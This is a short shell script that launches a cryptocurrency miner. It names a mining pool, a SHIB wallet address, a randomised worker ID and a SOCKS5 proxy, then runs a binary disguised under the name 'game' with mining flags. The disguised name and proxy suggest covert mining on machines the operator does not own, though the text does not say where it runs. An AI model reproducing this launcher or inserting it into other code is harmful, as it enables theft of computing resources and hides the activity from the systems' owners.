POOL=rx.unmineable.com:13333

WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)

PROXY=socks5://72.221.172.203:4145

chmod +x game

./game --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin 
